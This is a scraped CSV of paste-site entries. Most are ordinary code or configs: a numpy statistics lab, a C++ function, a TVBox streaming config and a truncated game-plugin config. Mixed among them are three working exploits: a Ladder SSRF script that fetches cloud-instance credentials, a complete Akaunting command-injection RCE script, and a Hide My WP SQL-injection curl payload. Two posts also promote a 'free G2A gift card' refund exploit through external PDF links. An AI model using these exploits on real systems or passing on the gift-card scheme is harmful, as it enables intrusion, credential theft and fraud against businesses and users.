id,title,username,language,date,content
zsiHF6dX,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Monday 11th of March 2024 01:04:18 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_915339.pdf

Working as of:
11 March 2024





















"
qGLXG5WH,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Monday 11th of March 2024 12:50:59 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.

This is not my pastebin account and im using a random inactive one to post this.
 
PDF guide here:
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
11 March 2024























"
LcmmA4jG,Mad,Unknown_No_1,PHP,Monday 11th of March 2024 12:26:50 AM CDT,RAMZANxSPECIALxKEY
97rmAx5N,Ladder v0.0.21 - Server-side request forgery (SSRF) - CVE-2024-27620,FlyFar,Python,Sunday 10th of March 2024 11:45:32 PM CDT,"# Exploit Title: Ladder v0.0.21 - Server-side request forgery (SSRF)
# Date: 2024-01-20
# Exploit Author: @_chebuya
# Software Link: https://github.com/everywall/ladder
# Version: v0.0.1 - v0.0.21
# Tested on: Ubuntu 20.04.6 LTS on AWS EC2 (ami-0fd63e471b04e22d0)
# CVE: CVE-2024-27620
# Description: Ladder fails to apply sufficient default restrictions on destination addresses, allowing an attacker to make GET requests to addresses that would typically not be accessible from an external context.  An attacker can access private address ranges, locally listening services, and cloud instance metadata APIs

import requests
import json

target_url = ""http://127.0.0.1:8080/api/""
imdsv1_url = ""http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance""

r = requests.get(target_url + imdsv1_url)
response_json = json.loads(r.text)
print(response_json[""body""])
            "
DapB19nB,Akaunting < 3.1.3 - RCE - CVE-2024-22836,FlyFar,Python,Sunday 10th of March 2024 11:44:40 PM CDT,"# Exploit Title: Akaunting < 3.1.3 - RCE
# Date: 08/02/2024
# Exploit Author: u32i@proton.me
# Vendor Homepage: https://akaunting.com
# Software Link: https://github.com/akaunting/akaunting
# Version: <= 3.1.3
# Tested on: Ubuntu (22.04)
# CVE : CVE-2024-22836

#!/usr/bin/python3

import sys
import re
import requests
import argparse

def get_company():
	# print(""[INF] Retrieving company id..."")
	res = requests.get(target, headers=headers, cookies=cookies, allow_redirects=False)
	if res.status_code != 302:
		print(""[ERR] No company id was found!"")
		sys.exit(3)
	cid = res.headers['Location'].split('/')[-1]
	if cid == ""login"":
		print(""[ERR] Invalid session cookie!"")
		sys.exit(7)
	return cid

def get_tokens(url):
	res = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)
	search_res = re.search(r""\""csrfToken\""\:\"".*\"""", res.text)

	if not search_res:
		print(""[ERR] Couldn't get csrf token"")
		sys.exit(1)

	data = {}
	data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('""', '')
	data['session'] = res.cookies.get('akaunting_session')
	return data

def inject_command(cmd):
	url = f""{target}/{company_id}/wizard/companies""
	tokens = get_tokens(url)
	headers.update({""X-Csrf-Token"": tokens['csrf_token']})
	data = {""_token"": tokens['csrf_token'], ""_method"": ""POST"", ""_prefix"": ""company"", ""locale"": f""en_US && {cmd}""}
	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
	if res.status_code == 200:
		res_data = res.json()
		if res_data['error']:
			print(""[ERR] Command injection failed!"")
			sys.exit(4)
		print(""[INF] Command injected!"")


def trigger_rce(app, version = ""1.0.0""):
	print(""[INF] Executing the command..."")
	url = f""{target}/{company_id}/apps/install""
	data = {""alias"": app, ""version"": version, ""path"": f""apps/{app}/download""}
	headers.update({""Content-Type"":""application/json""})
	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
	if res.status_code == 200:
		res_data = res.json()
		if res_data['error']:
			search_res = re.search(r"">Exit Code\:.*<"", res_data['message'])
			if search_res:
				print(""[ERR] Failed to execute the command"")
				sys.exit(6)
			print(""[ERR] Failed to install the app! no command was executed!"")
			sys.exit(5)
		print(""[INF] Executed successfully!"")

def login(email, password):
	url = f""{target}/auth/login""
	tokens = get_tokens(url)

	cookies.update({
		'akaunting_session': tokens['session']
	})

	data = {
		""_token"": tokens['csrf_token'],
		""_method"": ""POST"",
		""email"": email,
		""password"": password
	}
	
	req = requests.post(url, headers=headers, cookies=cookies, data=data)
	res = req.json()
	if res['error']:
		print(""[ERR] Failed to log in!"")
		sys.exit(8)

	print(""[INF] Logged in"")
	cookies.update({'akaunting_session': req.cookies.get('akaunting_session')})
		
def main():
	inject_command(args.command)
	trigger_rce(args.alias, args.version)

if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument(""-u"", ""--url"", help=""target url"")
	parser.add_argument(""--email"", help=""user login email."")
	parser.add_argument(""--password"", help=""user login password."")
	parser.add_argument(""-i"", ""--id"", type=int, help=""company id (optional)."")
	parser.add_argument(""-c"", ""--command"", help=""command to execute."")
	parser.add_argument(""-a"", ""--alias"", help=""app alias, default: paypal-standard"", default=""paypal-standard"")
	parser.add_argument(""-av"", ""--version"", help=""app version, default: 3.0.2"", default=""3.0.2"")

	args = parser.parse_args()
	
	headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36""}
	cookies = {}
	target = args.url

	try:
		login(args.email, args.password)
		company_id = get_company() if not args.id else args.id
		main()
	except:
		sys.exit(0)
            "
8XW8KM9z,Hide My WP < 6.2.9 - Unauthenticated SQLi - CVE-2022-4681,FlyFar,Email,Sunday 10th of March 2024 11:43:49 PM CDT,"# Exploit Title: Wordpress Plugin Hide My WP < 6.2.9 - Unauthenticated SQLi 
# Publication Date: 2023-01-11
# Original Researcher: Xenofon Vassilakopoulos
# Exploit Author: Xenofon Vassilakopoulos
# Submitter: Xenofon Vassilakopoulos
# Vendor Homepage: https://wpwave.com/
# Version: Hide My WP v6.2.8 and prior
# Tested on: Hide My WP v6.2.7
# Impact: Database Access
# CVE: CVE-2022-4681
# CWE: CWE-89
# CVSS Score: 8.6 (high)

## Description

The plugin does not properly sanitize and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection.


## Proof of Concept

curl -k --location --request GET ""http://localhost:10008"" --header ""X-Forwarded-For: 127.0.0.1'+(select*from(select(sleep(20)))a)+'""
            "
iyf1tCzp,numpy lab(11/03/2024),brandblox,Python,Sunday 10th of March 2024 11:29:17 PM CDT,"# -*- coding: utf-8 -*-
""""""
Created on Mon Mar 11 09:30:09 2024

@author: lab
""""""

import numpy as np
import pandas as pd
import seaborn as sns
# Example dataset
diamonds = sns.load_dataset(""diamonds"")
diamond_prices = diamonds[""price""]
mean_price = diamond_prices.mean()
median_price = diamond_prices.median()
std = diamond_prices.std()
skewness = (3 * (mean_price - median_price)) / std
print(f""The Pierson's second skewness score of diamond prices distribution is {skewness:.5f}"")
#The Pierson's second skewness score of diamond prices distribution is 1.15189
def moment_based_skew(distribution):
 n = len(distribution)
 mean = np.mean(distribution)
 std = np.std(distribution)

 # Divide the formula into two parts
 first_part = n / ((n - 1) * (n - 2))
 second_part = np.sum(((distribution - mean) / std) ** 3)

 skewness = first_part * second_part
 return skewness
skew = moment_based_skew(diamond_prices)
print(""The moment_based skewness score of diamond prices distribution is "", skew)
# Using Libraries
# Pandas version
print(""The moment_based skewness skewness score of diamond prices distribution is "",
diamond_prices.skew())
# SciPy version
from scipy.stats import skew
print(""The moment_based skewness skewness score of diamond prices distribution is "",
skew(diamond_prices))
# Visualization
import matplotlib.pyplot as plt
sns.kdeplot(diamond_prices)
plt.title(""Plot of diamond prices"")
plt.xlabel(""Price ($)"")"
MekTb7GX,Untitled,nathaditya,C++,Sunday 10th of March 2024 11:03:16 PM CDT,"Node* constructLinkedMatrix(int mat[MAX][MAX], int n)
{
    struct Node* head;
    struct Node* temp;
    
    vector<Node*> vec;
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n; j++){
            Node* newNode = new Node(mat[i][j]);
            if(j == 0){
                temp = newNode;
                vec.push_back(temp);
            }
            else{
                temp->right = newNode;
                temp = newNode;
            }
        }
    }
    
    head = vec[0];
    for(int i = 0; i < n; i++){
        for(int j = 0; j < n-1; j++){
            vec[j]->down = vec[j+1];
            vec[j] = vec[j]->right;
        }
        vec[n-1] = vec[n-1]->right;
    }
    return head;
}
"
abSyUuKc,jyzx,nanzhao2018,JSON,Sunday 10th of March 2024 10:53:56 PM CDT,"{
    ""wallpaper"": ""https://www.dmoe.cc/random.php"",
    ""spider"": ""https://agit.ai/895322156/Q/raw/branch/master/jar/xjy.jar;md5;e5f048383b35728c4f1bb21c708c0c7"",
    ""lives"": [
        {
          ""name"": ""直播"",
          ""type"": 0,
          ""playerType"": 1,
          ""url"": ""https://agit.ai/Yoursmile7/TVBox/raw/branch/master/live.txt"",
          ""epg"": ""http://epg.51zmt.top:8000/api/diyp/?ch={name}&date={date}"",
          //""epg"": ""https://epg.112114.xyz/?ch={name}&date={date}"",     
          ""logo"": ""http://epg.51zmt.top:8000/api/diyp/logo/{name}.png""
          //""logo"": ""https://epg.112114.xyz/logo/{name}.png""
        },
        {
            ""group"": ""redirect"",
            ""channels"": [
                {
                    ""name"": ""live"",
                    ""epg"": ""http://epg.51zmt.top:8000/api/diyp/?ch={name}&date={date}"",
                    //""urls"": [""proxy://do=live&type=txt&ext=aHR0cDovLzl4aTRvLnRrL09uZUNsaWNrUnVuL2xpdmUudHh0""]
                    ""urls"": [""proxy://do=live&type=txt&ext=https://agit.ai/Yoursmile7/TVBox/raw/branch/master/live.txt""]
                    //""urls"": [""proxy://do=live&type=txt&ext=http://dlq.gmqd.com/upload/20220921115985878587.txt""]
                    //""urls"": [""proxy://do=live&type=txt&ext=http://home.jundie.top:81/ray/tvlive.txt""]
                }
            ]
        }
    ],
    ""sites"": [
   {
            ""key"": ""知识"",
            ""name"": ""🌏知识┃学堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/知识.json"", ""jar"":""""
                   },
        {
            ""key"": ""儿童"",
            ""name"": ""🌏少儿┃教育"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/少儿.json"", ""jar"":""""
                    },
        {
            ""key"": ""小学"",
            ""name"": ""🌏小学┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学.json"", ""jar"":""""
                    },
        {
            ""key"": ""初中"",
            ""name"": ""🌏初中┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/初中.json"", ""jar"":""""
                   },
        {
            ""key"": ""高中"",
            ""name"": ""🌏高中┃课堂"",
            ""type"": 3,
            ""api"": ""csp_Bili"",
            ""searchable"": 0,
            ""quickSearch"": 0,
            ""filterable"": 0,
""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/高中.json"", ""jar"":""""
                    },
{""key"":""幼小衔接"",""name"":""🌏幼小衔接"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/幼小衔接.json"",""jar"": """"},
		{""key"":""幼儿启蒙"",""name"":""🌏幼儿启蒙"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/幼儿启蒙.json"",""jar"": """"},
		{""key"":""csp_hiker_兔小贝"",""name"":""🌏兔小贝"",""type"":3,""api"":""csp_XYQHiker"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兔小贝.json"",""jar"": """"},
		{""key"":""csp_hiker_兔小贝2"",""name"":""🌏兔小贝2"",""type"":3,""api"":""csp_XYQHiker"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兔小贝2.json"",""jar"": """"},
		
		{""key"":""小灯塔"",""name"":""🌏小灯塔"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔百科.json""
,""jar"": """"},
		{""key"":""小灯塔科学"",""name"":""🌏小灯塔科学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔科学.json"",""jar"": """"},
		{""key"":""小灯塔地理"",""name"":""🌏小灯塔地理"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔地理.json"",""jar"": """"},
		{""key"":""小灯塔国学"",""name"":""🌏小灯塔国学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔国学.json"",""jar"": """"},
		{""key"":""小灯塔人文"",""name"":""🌏小灯塔人文"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小灯塔人文.json"",""jar"": """"},
		
		{""key"":""儿童拼音"",""name"":""🌏儿童拼音"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童拼音.json"",""jar"": """"},
		{""key"":""儿童识字"",""name"":""🌏儿童识字"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童识字.json"",""jar"": """"},
		{""key"":""儿童英语"",""name"":""🌏儿童英语"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童英语.json"",""jar"": """"},
		{""key"":""儿童硬笔"",""name"":""🌏儿童硬笔"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童硬笔.json"",""jar"": """"},
		{""key"":""儿童思维"",""name"":""🌏儿童思维"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童思维.json"",""jar"": """"},
		{""key"":""儿童口才"",""name"":""🌏儿童口才"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童口才.json"",""jar"": """"},
		{""key"":""儿童编程"",""name"":""🌏儿童编程"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童编程.json"",""jar"": """"},
		{""key"":""儿童武术"",""name"":""🌏儿童武术"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/儿童武术.json"",""jar"": """"},
		
		{""key"":""兴趣培养"",""name"":""🌏兴趣培养"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/兴趣培养.json"",""jar"": """"},
		{""key"":""央视经典"",""name"":""🌏央视经典"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/央视经典.json"",""jar"": """"},
		{""key"":""益智动画"",""name"":""🌏益智动画"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/益智动画.json"",""jar"": """"},
		{""key"":""小学语文"",""name"":""🌏小学语文"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学语文.json"",""jar"": """"},
		{""key"":""小学数学"",""name"":""🌏小学数学"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学数学.json"",""jar"": """"},
		{""key"":""小学英语"",""name"":""🌏小学英语"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学英语.json"",""jar"": """"},
		{""key"":""小学教育"",""name"":""🌏小学教育"",""type"":3,""api"":""csp_Bili"",""searchable"":0,""quickSearch"":1,""filterable"":1,""ext"":""https://agit.ai/895322156/Q/raw/branch/master/XB/小学教育.json"",""jar"": """"}     
        
    ],
    ""parses"": [
        //{""name"":""解析聚合"",""type"":3,""url"":""Demo""},
        //{""name"":""Json并发"",""type"":2,""url"":""Parallel""},
        //{""name"":""Json轮询"",""type"":2,""url"":""Sequence""},
        {""name"":""1"",""type"":0,""url"":""https://jx.m3u8.pw/?url=""},
        {""name"":""2"",""type"":0,""url"":""https://jx.xmflv.com/?url=""},
        {""name"":""3"",""type"":0,""url"":""https://jx.bozrc.com:4433/player/?url="",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
        {""name"":""4"",""type"":0,""url"":""http://okjx.cc/?url="",""parse"":""1"",""ext"":{""flag"":[""qq"",""腾讯"",""qiyi"",""爱奇艺"",""奇艺"",""youku"",""优酷"",""mgtv"",""芒果"",""letv"",""乐视"",""pptv"",""PPTV"",""sohu"",""bilibili"",""哔哩哔哩"",""哔哩""]}},
        {""name"":""5"",""type"":0,""url"":""https://jx.yparse.com/index.php?url=""},
        {""name"":""6"",""type"":0,""url"":""https://jx.jsonplayer.com/player/?url=""},
        {""name"":""7"",""type"":0,""url"":""https://jx.aidouer.net/?url=""},
        {""name"":""8"",""type"":0,""url"":""https://jx.quankan.app/?url=""}
        
    ],
    ""flags"": [
        ""youku"",
        ""qq"",
        ""iqiyi"",
        ""qiyi"",
        ""letv"",
        ""sohu"",
        ""tudou"",
        ""pptv"",
        ""mgtv"",
        ""wasu"",
        ""bilibili"",
        ""renrenmi""
    ],
    ""rules"":[
        {
        ""host"":""www.iesdouyin.com"",
        ""rule"":[""playwm/?video_id=""]
        },
        {
        ""host"":""v.douyin.com"",
        ""rule"":[""playwm/?video_id=""]
        }
    ],
    ""ijk"": [
        {
            ""group"": ""软解码"",
            ""options"": [
                {
                    ""category"": 4,
                    ""name"": ""opensles"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""overlay-format"",
                    ""value"": ""842225234""
                },
                {
                    ""category"": 4,
                    ""name"": ""framedrop"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""soundtouch"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""start-on-prepared"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""http-detect-range-support"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""fflags"",
                    ""value"": ""fastseek""
                },
                {
                    ""category"": 2,
                    ""name"": ""skip_loop_filter"",
                    ""value"": ""48""
                },
                {
                    ""category"": 4,
                    ""name"": ""reconnect"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""enable-accurate-seek"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-auto-rotate"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-handle-resolution-change"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-hevc"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""dns_cache_timeout"",
                    ""value"": ""600000000""
                }
            ]
        },
        {
            ""group"": ""硬解码"",
            ""options"": [
                {
                    ""category"": 4,
                    ""name"": ""opensles"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""overlay-format"",
                    ""value"": ""842225234""
                },
                {
                    ""category"": 4,
                    ""name"": ""framedrop"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""soundtouch"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""start-on-prepared"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""http-detect-range-support"",
                    ""value"": ""0""
                },
                {
                    ""category"": 1,
                    ""name"": ""fflags"",
                    ""value"": ""fastseek""
                },
                {
                    ""category"": 2,
                    ""name"": ""skip_loop_filter"",
                    ""value"": ""48""
                },
                {
                    ""category"": 4,
                    ""name"": ""reconnect"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""enable-accurate-seek"",
                    ""value"": ""0""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-auto-rotate"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-handle-resolution-change"",
                    ""value"": ""1""
                },
                {
                    ""category"": 4,
                    ""name"": ""mediacodec-hevc"",
                    ""value"": ""1""
                },
                {
                    ""category"": 1,
                    ""name"": ""dns_cache_timeout"",
                    ""value"": ""600000000""
                }
            ]
        }
    ],
    ""ads"": [
        ""mimg.0c1q0l.cn"",
        ""www.googletagmanager.com"",
        ""www.google-analytics.com"",
        ""mc.usihnbcq.cn"",
        ""mg.g1mm3d.cn"",
        ""mscs.svaeuzh.cn"",
        ""cnzz.hhttm.top"",
        ""tp.vinuxhome.com"",
        ""cnzz.mmstat.com"",
        ""www.baihuillq.com"",
        ""s23.cnzz.com"",
        ""z3.cnzz.com"",
        ""c.cnzz.com"",
        ""stj.v1vo.top"",
        ""z12.cnzz.com"",
        ""img.mosflower.cn"",
        ""tips.gamevvip.com"",
        ""ehwe.yhdtns.com"",
        ""xdn.cqqc3.com"",
        ""www.jixunkyy.cn"",
        ""sp.chemacid.cn"",
        ""hm.baidu.com"",
        ""s9.cnzz.com"",
        ""z6.cnzz.com"",
        ""um.cavuc.com"",
        ""mav.mavuz.com"",
        ""wofwk.aoidf3.com"",
        ""z5.cnzz.com"",
        ""xc.hubeijieshikj.cn"",
        ""tj.tianwenhu.com"",
        ""xg.gars57.cn"",
        ""k.jinxiuzhilv.com"",
        ""cdn.bootcss.com"",
        ""ppl.xunzhuo123.com"",
        ""xomk.jiangjunmh.top"",
        ""img.xunzhuo123.com"",
        ""z1.cnzz.com"",
        ""s13.cnzz.com"",
        ""xg.huataisangao.cn"",
        ""z7.cnzz.com"",
        ""xg.huataisangao.cn"",
        ""z2.cnzz.com"",
        ""s96.cnzz.com"",
        ""q11.cnzz.com"",
        ""thy.dacedsfa.cn"",
        ""xg.whsbpw.cn"",
        ""s19.cnzz.com"",
        ""z8.cnzz.com"",
        ""s4.cnzz.com"",
        ""f5w.as12df.top"",
        ""ae01.alicdn.com"",
        ""www.92424.cn"",
        ""k.wudejia.com"",
        ""vivovip.mmszxc.top"",
        ""qiu.xixiqiu.com"",
        ""cdnjs.hnfenxun.com"",
        ""cms.qdwght.com""
    ]
}"
ZZmHADkz,RaidableBasesConfig,nivex,JSON,Sunday 10th of March 2024 10:49:54 PM CDT,"{
  ""Settings"": {
    ""Show Direction To Coordinates"": false,
    ""Experimental [* = everything]"": {
      ""Apply Custom Auto Height To"": [],
      ""Bunker Bases Or Profiles"": [],
      ""Multi Foundation Bases Or Profiles"": []
    },
    ""Raid Management"": {
      ""Divide Locker Loot When Enabled"": true,
      ""Ignore List For Turn Lights On"": [
        ""laserlight"",
        ""weaponrack"",
        ""lightswitch"",
        ""soundlight"",
        ""xmas""
      ],
      ""Grids To Block Spawns At"": [],
      ""Block Spawns At Positions"": [
        {
          ""position"": ""(0.00, 0.00, 0.00)"",
          ""radius"": 200.0
        }
      ],
      ""Additional Map Prefabs To Block Spawns At"": {
        ""test_prefab"": 150.0,
        ""test_prefab_2"": 125.25
      },
      ""Eject Mounts"": {
        ""All Controlled Mounts"": false,
        ""All Other Mounts"": false,
        ""Attack Helicopters"": false,
        ""Boats"": false,
        ""Campers"": true,
        ""Cars (Basic)"": false,
        ""Cars (Modular)"": false,
        ""Chinook"": false,
        ""Flying Carpet"": false,
        ""Horses"": false,
        ""HotAirBalloon"": true,
        ""Jetpacks"": true,
        ""MiniCopters"": false,
        ""Parachutes"": false,
        ""Pianos"": true,
        ""Scrap Transport Helicopters"": false,
        ""Snowmobiles"": false,
        ""Tugboats"": false
      },
      ""Max Amount Of Players Allowed To Enter (0 = infinite, -1 = none)"": {
        ""Maintained Events"": 0,
        ""Manual Events"": 0,
        ""Scheduled Events"": 0,
        ""Bypass For PVP Bases"": false
      },
      ""Additional Containers To Include As Boxes"": [
        ""locker""
      ],
      ""Difficulty Colors (Border)"": {
        ""Normal"": ""000000""
      },
      ""Difficulty Colors (Inner)"": {
        ""Normal"": ""00FF00""
      },
      ""Entities Allowed To Drop Loot"": {
        ""Auto Turrets"": false,
        ""Flame Turret"": false,
        ""Fog Machine"": false,
        ""Gun Trap"": false,
        ""SAM Site"": false
      },
      ""Additional Blocked Colliders"": [
        ""cube""
      ],
      ""Allow Teleport"": false,
      ""Allow Cupboard Loot To Drop"": true,
      ""Allow Players To Build"": true,
      ""Allow Players To Use Ladders"": true,
      ""Allow Players To Upgrade Event Buildings"": false,
      ""Allow Player Bags To Be Lootable At PVP Bases"": true,
      ""Allow Player Bags To Be Lootable At PVE Bases"": true,
      ""Allow Players To Loot Traps"": false,
      ""Allow Npcs To Target Other Npcs"": false,
      ""Allow Raid Bases Inland"": true,
      ""Allow Raid Bases On Beaches"": true,
      ""Allow Raid Bases On Ice Sheets"": false,
      ""Allow Raid Bases On Roads"": true,
      ""Allow Raid Bases On Rivers"": true,
      ""Allow Raid Bases On Railroads"": false,
      ""Allow Raid Bases On Building Topology"": true,
      ""Allow Raid Bases On Monument Topology"": false,
      ""Amount Of Spawn Position Checks Per Frame (ADVANCED USERS ONLY)"": 25,
      ""Allow Vending Machines To Broadcast"": false,
      ""Backpacks Can Be Opened At PVE Bases"": true,
      ""Backpacks Can Be Opened At PVP Bases"": true,
      ""Backpacks Drop At PVE Bases"": false,
      ""Backpacks Drop At PVP Bases"": false,
      ""Block Npc Kits Plugin"": false,
      ""Block Helicopter Damage To Bases"": false,
      ""Block Mounted Damage To Bases And Players"": false,
      ""Block Mini Collision Damage"": false,
      ""Block DoubleJump Plugin"": true,
      ""Block RestoreUponDeath Plugin For PVP Bases"": false,
      ""Block RestoreUponDeath Plugin For PVE Bases"": false,
      ""Block LifeSupport Plugin"": true,
      ""Block Rewards During Server Restart"": false,
      ""Bypass Lock Treasure To First Attacker For PVE Bases"": false,
      ""Bypass Lock Treasure To First Attacker For PVP Bases"": false,
      ""Despawn Spawned Mounts"": true,
      ""Do Not Destroy Player Built Deployables"": true,
      ""Do Not Destroy Player Built Structures"": true,
      ""Distance To Spawn From Center Of Map"": 200.0,
      ""Divide Rewards Among All Raiders"": true,
      ""Draw Corpse Time (Seconds)"": 300.0,
      ""Destroy Boxes Clipped Too Far Into Terrain"": true,
      ""Destroy Turrets Clipped Too Far Into Terrain"": true,
      ""Eject Sleepers Before Spawning Base"": true,
      ""Eject Scavengers When Raid Is Completed"": true,
      ""Extra Distance To Spawn From Monuments"": 25.0,
      ""Move Cookables Into Ovens"": true,
      ""Move Food Into BBQ Or Fridge"": true,
      ""Blacklist For BBQ And Fridge"": [
        ""syrup"",
        ""pancakes""
      ],
      ""Move Resources Into Tool Cupboard"": true,
      ""Move Items Into Lockers"": true,
      ""Lock Treasure To First Attacker"": true,
      ""Lock Treasure Max Inactive Time (Minutes)"": 20.0,
      ""Lock Players To Raid Base After Entering Zone"": false,
      ""Only Award First Attacker and Allies"": false,
      ""Only Award Owner Of Raid"": false,
      ""Minutes Until Despawn After Looting (min: 1)"": 15,
      ""Minutes Until Despawn After Looting Resets When Damaged"": false,
      ""Minutes Until Despawn After Inactive (0 = disabled)"": 45,
      ""Minutes Until Despawn After Inactive Resets When Damaged"": true,
      ""Mounts Can Take Damage From Players"": false,
      ""Player Cupboard Detection Radius"": 125.0,
      ""Players With PVP Delay Can Damage Anything Inside Zone"": false,
